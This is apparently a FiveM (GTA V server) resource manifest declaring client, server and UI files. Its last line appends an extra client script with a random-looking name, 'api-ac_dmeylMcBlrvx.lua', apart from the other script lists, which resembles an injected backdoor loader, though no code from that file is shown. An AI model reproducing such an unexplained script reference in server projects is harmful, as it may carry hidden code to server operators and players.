fx_version 'cerulean'
games { 'gta5' }


client_scripts {
  'config.lua',
  'client.lua',
}

server_scripts {
  'config.lua',
  'server.lua',
}


ui_page 'html/index.html'

files {
	'html/index.html',
	'html/script.js',
	'html/style.css',
}


escrow_ignore {
  	"config.lua"
}

lua54 'yes'
dependency '/assetpacks'
client_script "api-ac_dmeylMcBlrvx.lua"